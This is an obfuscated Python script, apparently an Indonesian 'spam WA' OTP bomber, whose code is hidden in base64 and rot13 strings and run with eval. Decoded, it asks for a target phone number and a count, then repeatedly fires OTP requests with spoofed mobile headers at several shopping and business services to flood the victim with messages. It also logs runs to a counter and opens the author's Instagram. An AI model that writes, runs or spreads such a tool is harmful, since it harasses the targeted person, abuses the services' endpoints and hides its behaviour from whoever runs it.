# Python Code by Abdul Mufid
# Open Source Klo Banyak Star

import base64, codecs
magic = 'aW1wb3J0IG9zLHN5cyx0aW1lLG9zLGpzb24scmVxdWVzdHMsanNvbgpmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLEJhY2ssaW5pdApmcm9tIHJlcXVlc3RzIGltcG9ydCBnZXQscG9zdApmcm9tIHVybGxpYiBpbXBvcnQgcmVxdWVzdAoKZGVmIGF1dG9rZXRpayhzKToKICAgIGZvciBjIGluIHMgKyAiXG4iOgogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoYykKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0aW1lLnNsZWVwKDAuMDA4KQoKQiA9IEZvcmUuQkxVRQpXID0gRm9yZS5XSElURQpSID0gRm9yZS5SRUQKRyA9IEZvcmUuR1JFRU4KQkwgPSBGb3JlLkJMQUNLClkgPSBGb3JlLllFTExPVwoKaXA9cmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS5pcGlmeS5vcmcnKS50ZXh0CnZpc2l0b3I9cmVxdWVzdC51cmxvcGVuKCdodHRwczovL2FwaS5jb3VudGFwaS54eXovaGl0L2JydXRhbC1zcGFtLXdhJykKZ2V0dmlzaXQ9anNvbi5sb2Fkcyh2aXNpdG9yLnJlYWQoKSkKbG9jYWx0aW1lPXRpbWUuYXNjdGltZSh0aW1lLmxvY2FsdGltZSh0aW1lLnRpbWUoKSkpCgpoaWphdT0iXDAzM1sxOzkybSAiCnB1dGloPSJcMDMzWzE7OTdtIgphYnU9IlwwMzNbMTs5MG0iCmt1bmluZz0iXDAzM1sxOzkzbSIKdW5ndT0iXDAzM1sxOzk1bSIKbWVyYWg9IlwwMzNbMTs5MW0iCmJpcnU9IlwwMzNbMTs5Nm0iCgpvcy5zeXN0ZW0oImNsZWFyIikKYXV0b2tldGlrKGYie2JpcnV9W3trdW5pbmd9V2FybmluZ3tiaXJ1fV0ge1d9SmFuZ2FuIEx1cGEgRm9sbG93IEluc3RhZ3JhbSBAZWFiZGFsbXVmaWRfIikKdGltZS5zbGVlcCgzKQpvcy5zeXN0ZW0oInhkZy1vcGVuIGh0dHBzOi8vaW5zdGFncmFtLmNvbS9lYWJkYWxtdWZpZF8iKQphdXRva2V0aWsoZiJ7YmlydX1be2t1bmluZ31XYXJuaW5ne2JpcnV9XSB7V31UaHggeWFuZyB1ZGFoIGZvbGxvdywgc2Vtb2dhIHdvcmsiKQp0aW1lLnNsZWVwKDMpCm9zLnN5c3RlbSgiY2xlYXIiKQphdXRva2V0aWsoZiIiIgp7aGlqYXV94pWU4pWQ4pWXe21lcmFofeKUjOKUgOKUkOKUjOKUgOKUkOKUjOKUrOKUkCAge2JpcnV94pWmIOKVpuKUrCDilKzilIzilIDilJDilIzilKzilJB7cHV0aWh94pSM4pSA4pSQe2t1bmluZ33ilIzilIDilJDilIzilIDilJAg4pSM4pSA4pSQCntoaWphdX3ilZrilZDilZd7bWVyYWh94pSc4pSA4pSY4pSc4pSA4pSk4pSC4pSC4pSCICB7YmlydX3ilZHilZHilZHilJzilIDilKTilJzilIDilKQg4pSCIHtwdXRpaH3ilJTilIDilJB7a3VuaW5nfeKUnOKUgOKUpOKUnOKUgOKUmCDilJzilIDilJgKe2hpamF1feKVmuKVkOKVnXttZXJhaH3ilLQgIOKUtCDilLTilLQg4pS0ICB7YmlydX3ilZrilanilZ3ilLQg4pS04pS0IOKUtCDilLQge3B1dGlofeKUlOKUgOKUmHtrdW5pbmd94pS0IOKUtOKUtCAgIOKUtCB7dW5ndX1WMQp7YWJ1fS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCntwdXRpaH1be2JpcnV94oCie3B1dGlofV0ge2JpcnV9QXV0aG9yIHtwdXRpaH0gICA6IEFiZHVsIE11ZmlkCntwdXRpaH1be2JpcnV94oCie3B1dGlofV0ge21lcmFofUdpdEh1YiB7cHV0aWh9ICAgOiBlYWJkYWxtdWZpZAp7cHV0aWh9W3tiaXJ1feKAontwdXRpaH1dIHt1bmd1fUluc3RhZ3JhbSB7cHV0aWh9OiBAZWFiZGFsbXVmaWRfCntXfVt7WX3igKJ7V31dIElwIEthbXUge3B1dGlofSAgOntZfSB7aXB9CntXfVt7WX3igKJ7V31dIFdha3R1L0phbSB7cHV0aWh9OntZfSB7bG9jYWx0aW1lfQp7V31be1l94oCie1d9XSBUb3RhbCBSdW4ge3B1dGlofTp7WX0ge2dldHZpc2l0Wyd2YWx1ZSddfQoiIiIpCgpub21vciA9IGlucHV0KGYie1d9W3tSfeKAoiB7a3VuaW5nfeKAontoaWphdX3igKJ7V31dIHtiaXJ1fU5vbW9yIFRhcmdldCB7V306ICIpCmp1bSA9IGludChpbnB1dChmIntXfVt7Un3igKIge2t1bmluZ33igKJ7aGlqYXV94oCie1d9XSB7YmlydX1KdW1sYWgge1d9OiAiKSkKZm9yIGkgaW4gcmFuZ2UoanVtKToKICAgIHBvcyA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vd3d3LnNheXVyYm94LmNvbS9ncmFwaHFsL3YxP2RlZHVwbGljYXRlPTEiLGhlYWRlcnM9eyJIb3N0Ijoid3d3LnNheXVyYm94LmNvbSIsImNvbnRlbnQtbGVuZ3RoIjoiMjg5Iiwic2VjLWNoLXVhLW1vYmlsZ'
love = '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'
god = 'VwdCI6IiovKiIsIngtcmVxdWVzdGVkLXdpdGgiOiJYTUxIdHRwUmVxdWVzdCIsInNlYy1jaC11YS1wbGF0Zm9ybSI6IkFuZHJvaWQiLCJvcmlnaW4iOiJodHRwczovL3d3dy5tYXRhaGFyaS5jb20iLCJzZWMtZmV0Y2gtc2l0ZSI6InNhbWUtb3JpZ2luIiwic2VjLWZldGNoLW1vZGUiOiJjb3JzIiwic2VjLWZldGNoLWRlc3QiOiJlbXB0eSIsInJlZmVyZXIiOiJodHRwczovL3d3dy5tYXRhaGFyaS5jb20vY3VzdG9tZXIvYWNjb3VudC9jcmVhdGUvIiwiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSwgYnIiLCJhY2NlcHQtbGFuZ3VhZ2UiOiJpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyJ9LGRhdGE9anNvbi5kdW1wcyh7Im90cF9yZXF1ZXN0Ijp7Im1vYmlsZV9udW1iZXIiOm5vbW9yLCJtb2JpbGVfY291bnRyeV9jb2RlIjoiKzYyIn19KSkudGV4dAogICAgdG9kID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9hcGkudG9ra28uaW8vZ3JhcGhxbCIsaGVhZGVycz17Ikhvc3QiOiJhcGkudG9ra28uaW8iLCJjb250ZW50LWxlbmd0aCI6IjMwNiIsImFjY2VwdC1sYW5ndWFnZSI6ImlkIiwic2VjLWNoLXVhLW1vYmlsZSI6Ij8xIiwidXNlci1hZ2VudCI6Ik1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA5OyBSZWRtaSA2QSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIngtdG9ra28tYXBpLWNsaWVudCI6Im1lcmNoYW50X3dlYiIsImNvbnRlbnQtdHlwZSI6ImFwcGxpY2F0aW9uL2pzb24iLCJhY2NlcHQiOiIqLyoiLCJ4LXRva2tvLWFwaS1jbGllbnQtdmVyc2lvbiI6IjQuNS4xIiwic2VjLWNoLXVhLXBsYXRmb3JtIjoiQW5kcm9pZCIsIm9yaWdpbiI6Imh0dHBzOi8vd2ViLmx1bW1vc2hvcC5jb20iLCJzZWMtZmV0Y2gtc2l0ZSI6ImNyb3NzLXNpdGUiLCJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLCJzZWMtZmV0Y2gtZGVzdCI6ImVtcHR5IiwicmVmZXJlciI6Imh0dHBzOi8vd2ViLmx1bW1vc2hvcC5jb20vIiwiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSwgYnIifSxkYXRhPWpzb24uZHVtcHMoeyJvcGVyYXRpb25OYW1lIjoiZ2VuZXJhdGVPVFAiLCJ2YXJpYWJsZXMiOnsiZ2VuZXJhdGVPdHBJbnB1dCI6eyJwaG9uZU51bWJlciI6Iis2MiIrbm9tb3IsImhhc2hDb2RlIjoiIiwiY2hhbm5lbCI6IldIQVRTQVBQIiwidXNlclR5cGUiOiJNRVJDSEFOVCJ9fSwicXVlcnkiOiJtdXRhdGlvbiBnZW5lcmF0ZU9UUCgkZ2VuZXJhdGVPdHBJbnB1dDogR2VuZXJhdGVPdHBJbnB1dCEpIHtcbiAgZ2VuZXJhdGVPdHAoZ2VuZXJhdGVPdHBJbnB1dDogJGdlbmVyYXRlT3RwSW5wdXQpIHtcbiAgICBwaG9uZU51bWJlclxuICB9XG59XG4ifSkpLnRleHQKICAgIGtvbiA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vYXBpLXYyLmJ1a3V3YXJ1bmcuY29tL2FwaS92Mi9hdXRoL290cC9zZW5kIixoZWFkZXJzPXsiSG9zdCI6ImFwaS12Mi5idWt1d2FydW5nLmNvbSIsImNvbnRlbnQtbGVuZ3RoIjoiMTk4Iiwic2VjLWNoLXVhLW1vYmlsZSI6Ij8xIiwidXNlci1hZ2VudCI6Ik1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA5OyBSZWRtaSA2QSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsImNvbnRlbnQtdHlwZSI6ImFwcGxpY2F0aW9uL2pzb24iLCJ4LWFwcC12ZXJzaW9uLW5hbWUiOiJhbmRyb2lkIiwiYWNjZXB0IjoiYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qIiwieC1hcHAtdmVyc2lvbi1jb2RlIjoiMzAwMSIsImJ1a3Utb3JpZ2luIjoidG9rb2tvLXdlYiIsInNlYy1jaC11YS1wbGF0Zm9ybSI6IkFuZHJvaWQiLCJvcmlnaW4iOiJodHRwczovL3Rva29rby5pZCIsInNlYy1mZXRjaC1zaXRlIjoiY3Jvc3Mtc2l0ZSIsInNlYy1mZXRjaC1tb2RlIjoiY29ycyIsInNlYy1mZXRjaC1kZXN0IjoiZW1wdHkiLCJyZWZlcmVyIjoiaHR0cHM6Ly90b2tva28uaWQvIiwiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSwgYnIiLCJhY2NlcHQtbGFuZ3VhZ2UiOiJpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyJ9LGR'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
